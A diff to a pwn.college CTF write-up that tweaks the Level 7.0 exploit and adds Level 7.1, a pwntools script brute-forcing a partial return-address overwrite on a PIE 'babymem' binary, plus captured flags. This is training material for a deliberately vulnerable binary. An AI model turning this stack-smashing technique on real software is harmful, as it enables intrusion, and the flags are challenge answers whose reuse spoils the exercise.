@@ -2407,7 +2407,7 @@ def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
 
 padding_size = 0x38
 fixed_offset = b"\x0a"
-unknown_bytes = [bytes([i]) for i in range(0x0C, 0x10C, 0x10)]
+possible_bytes = [bytes([i]) for i in range(0x0C, 0x10C, 0x10)]
 
 
 def send_payload(target, payload):
@@ -2422,7 +2422,7 @@ def send_payload(target, payload):
 
         return b"You win!" in response
     except Exception as e:
-        print(f"An error occurred: {e}")
+        log.failure(f"An error occurred: {e}")
 
         return False
 
@@ -2432,7 +2432,7 @@ while True:
         target = launch()
 
         payload = b"A" * padding_size
-        payload += fixed_offset + random.choice(unknown_bytes)
+        payload += fixed_offset + random.choice(possible_bytes)
         log.info(f"Trying payload: {payload.hex()}")
 
         if send_payload(target, payload):
@@ -2441,9 +2441,99 @@ while True:
             pause()
             exit()
     except Exception as e:
-        print(f"An error occurred in main loop: {e}")
+        log.error(f"An error occurred in main loop: {e}")
 ```
 
 #### Flag
 
 Flag: `pwn.college{0svlAHsYG0L-ONps0VQ3ssICrbb.0VMwMDL5cTNxgzW}`
+
+### Level 7.1
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary!
+
+#### Write-up
+
+和上一题一样的，这里就不多赘述了。
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import context, ELF, log, pause, process, random, remote, gdb
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-7-1"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding_size = 0x88
+fixed_offset = b"\x3d"
+possible_bytes = [bytes([i]) for i in range(0x08, 0x108, 0x10)]
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+        target.recvuntil(b"Payload size: ")
+        target.sendline(payload_size)
+        target.recvuntil(b"Send your payload")
+        target.send(payload)
+
+        response = target.recvall()
+
+        return b"You win!" in response
+    except Exception as e:
+        log.failure(f"An error occurred: {e}")
+
+        return False
+
+
+while True:
+    try:
+        target = launch()
+
+        payload = b"A" * padding_size
+        payload += fixed_offset + random.choice(possible_bytes)
+        log.info(f"Trying payload: {payload.hex()}")
+
+        if send_payload(target, payload):
+            log.success("Success! Exiting...")
+
+            pause()
+            exit()
+    except Exception as e:
+        log.error(f"An error occurred in main loop: {e}")
+```
+
+#### Flag
+
+Flag: `pwn.college{EC4bj1hO9Oo1kCMvjnoAdmOg2ed.0lMwMDL5cTNxgzW}`
